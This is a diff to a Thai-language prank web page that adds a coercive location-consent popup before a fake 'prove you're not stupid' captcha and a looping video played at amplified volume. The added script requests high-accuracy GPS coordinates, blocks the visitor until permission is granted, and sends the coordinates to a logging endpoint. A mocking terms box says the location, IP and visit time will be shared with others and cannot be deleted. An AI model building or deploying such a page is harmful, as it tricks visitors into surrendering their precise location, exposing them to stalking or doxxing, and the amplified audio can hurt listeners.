@@ -20,6 +20,7 @@
   video { object-fit: cover; }
 }
   #gate { height: 100%; display: grid; place-items: center; padding: 16px; }
+  #gate[hidden] { display: none; }
   #box { display: flex; align-items: center; gap: 14px; background: #f9f9f9;
     border: 1px solid #d3d3d3; border-radius: 4px; padding: 16px 20px;
     width: 300px; max-width: 100%; cursor: pointer; user-select: none; font-size: 1rem; }
@@ -33,12 +34,50 @@
 
   #wrap { display: flex; flex-direction: column; align-items: center; gap: 12px;
   width: 300px; max-width: 100%; }
-#title { margin: 2; color: #eee; font-size: 2rem; text-align: center; }
+#title { margin: 0; color: #eee; font-size: 2rem; text-align: center; }
+
+  /* ===== หน้าขอตำแหน่ง: พื้นดำ + pop up ===== */
+  #consent { position: fixed; inset: 0; background: #000; display: grid;
+    place-items: center; padding: 16px; z-index: 5; }
+  #consent[hidden] { display: none; }
+  #popup { background: #fff; border-radius: 10px; padding: 24px 20px 18px;
+    width: 320px; max-width: 100%; box-sizing: border-box; text-align: center;
+    box-shadow: 0 8px 30px rgba(0,0,0,.6); }
+  #popup .ptitle { margin: 0 0 16px; font-size: 1.1rem; color: #222; }
+  .btn { background: #1a73e8; color: #fff; border: 0; border-radius: 6px;
+    padding: 12px 32px; font-size: 1rem; font-family: inherit; cursor: pointer; width: 100%; }
+      .err { margin: 12px 0 0; font-size: .85rem; color: #d93025; line-height: 1.4; }
+  .err[hidden] { display: none; }
+  .small { margin: 12px 0 0; font-size: .75rem; color: #555; }
+  .link { color: #1a73e8; text-decoration: underline; cursor: pointer;
+    background: none; border: 0; padding: 0; font: inherit; }
+
+  /* หน้าต่างข้อยินยอม */
+  #modal { position: fixed; inset: 0; background: rgba(0,0,0,.6); display: none;
+    place-items: center; padding: 16px; z-index: 10; }
+  #modal.show { display: grid; }
+  #modal .card { background: #fff; border-radius: 8px; padding: 20px; max-width: 380px;
+    max-height: 80vh; overflow: auto; text-align: left; font-size: .9rem; line-height: 1.5; }
+  #modal h3 { margin: 0 0 8px; }
+  #modal ul { padding-left: 20px; margin: 8px 0; }
+  #modal .btn { margin-top: 8px; }
 </style>
 </head>
 <body>
 
-<div id="gate">
+<!-- หน้า 1: ขอตำแหน่ง (พื้นดำ + pop up) -->
+<div id="consent">
+  <div id="popup" role="dialog" aria-modal="true" aria-labelledby="ptitle">
+    <p class="ptitle" id="ptitle">ต้องการตำแหน่ง โปรดกดยืนยัน</p>
+    <button id="confirmBtn" class="btn">ยืนยัน</button>
+    <p id="err" class="err" hidden></p>
+    <p class="small">หากกดปุ่มยืนยันจะเป็นการยอมรับ
+      <button id="openTerms" class="link">ข้อยินยอม</button></p>
+  </div>
+</div>
+
+<!-- หน้า 2: แคปช่า -->
+<div id="gate" hidden>
   <div id="wrap">
     <p id="title">โปรดยืนยันว่าคุณไม่ได้โง่</p>
     <div id="box" role="checkbox" aria-checked="false" tabindex="0">
@@ -48,20 +87,40 @@
   </div>
 </div>
 
-<video id="clip" controls playsinline hidden preload="auto">
+<video id="clip" controls playsinline loop hidden preload="auto">
   <source src="clip.mp4" type="video/mp4">
 </video>
+
+<!-- ข้อยินยอม -->
+<div id="modal">
+  <div class="card">
+    <h3>ข้อยินยอมการเก็บข้อมูล</h3>
+    <p>เมื่อกดยืนยัน เว็บไซต์นี้จะเก็บข้อมูลดังนี้</p>
+    <ul>
+      <li>ตำแหน่งที่ตั้งของคุณ (พิกัดละติจูด/ลองจิจูด)</li>
+      <li>หมายเลข IP address</li>
+      <li>วันและเวลาที่เข้าชม</li>
+    </ul>
+    <p>วัตถุประสงค์: <b>ไม่เสือกนะจ่ะ</b></p>
+    <p>ข้อมูลจะถูกเปิดเผยแก่บุคคลอื่น และคุณไม่สามารถติดต่อขอลบข้อมูลได้</p>
+    <p>เบราว์เซอร์จะถามขออนุญาตตำแหน่งอีกครั้ง คุณห้ามกด "ไม่อนุญาต"</p>
+    <button id="closeTerms" class="btn">ปิด</button>
+  </div>
+</div>
 
 <script>
   // ===== ตั้งค่าตรงนี้ =====
   // 0 ถึง 1  = ความดังปกติ (ใช้ได้ทุกกรณี)
   // มากกว่า 1 = ขยายเสียง (ต้องเปิดผ่านเว็บโฮสต์หรือเซิร์ฟเวอร์ ไม่ใช่ไฟล์ในเครื่อง)
   const VOLUME = 7;
+  const API_URL = "/api/log"; // ปลายทางรับข้อมูล (ไฟล์ api/log.js)
   // ========================
 
   const clip = document.getElementById("clip");
   const gate = document.getElementById("gate");
   const box = document.getElementById("box");
+  const consent = document.getElementById("consent");
+  const modal = document.getElementById("modal");
 
   let ctx = null;
   if (VOLUME > 1) {
@@ -75,6 +134,71 @@
     clip.volume = VOLUME;
   }
 
+  // ----- ข้อยินยอม -----
+  document.getElementById("openTerms").onclick = () => modal.classList.add("show");
+  document.getElementById("closeTerms").onclick = () => modal.classList.remove("show");
+
+  // ส่งข้อมูลไปเก็บ (ไม่รอผล เพื่อไม่ให้หน่วง)
+  function send(payload) {
+    try {
+      fetch(API_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload),
+        keepalive: true
+      }).catch(() => {});
+    } catch (e) {}
+  }
+
+  function showGate() {
+    consent.hidden = true;
+    gate.hidden = false;
+  }
+
+  // ปุ่มยืนยัน = ยอมรับข้อยินยอม แล้วขอตำแหน่ง
+  const confirmBtn = document.getElementById("confirmBtn");
+  const err = document.getElementById("err");
+
+  function fail(msg) {
+    err.textContent = msg;
+    err.hidden = false;
+    confirmBtn.disabled = false;
+    confirmBtn.textContent = "ยืนยันอีกครั้ง";
+  }
+
+  confirmBtn.onclick = () => {
+    err.hidden = true;
+    if (!navigator.geolocation) {
+      fail("เบราว์เซอร์นี้ไม่รองรับการระบุตำแหน่ง จึงไม่สามารถไปต่อได้");
+      return;
+    }
+    confirmBtn.disabled = true;
+    confirmBtn.textContent = "กำลังขอตำแหน่ง...";
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        send({
+          consent: true,
+          location: {
+            lat: pos.coords.latitude,
+            lng: pos.coords.longitude,
+            accuracy: pos.coords.accuracy
+          }
+        });
+        showGate();
+      },
+      e => {
+        // ไม่อนุญาต / หาตำแหน่งไม่ได้ = ไม่ผ่าน ต้องกดยืนยันใหม่
+        if (e && e.code === 1) {
+          fail("ต้องอนุญาตตำแหน่งก่อนจึงจะไปต่อได้ โปรดกดยืนยันอีกครั้งแล้วเลือก \"อนุญาต\"");
+        } else {
+          fail("หาตำแหน่งไม่ได้ โปรดตรวจสอบว่าเปิด GPS/อินเทอร์เน็ตแล้ว แล้วกดยืนยันอีกครั้ง");
+        }
+      },
+      { enableHighAccuracy: true, timeout: 10000 }
+    );
+  };
+
+  // ----- แคปช่า -----
   let busy = false;
   function start() {
     if (busy) return;
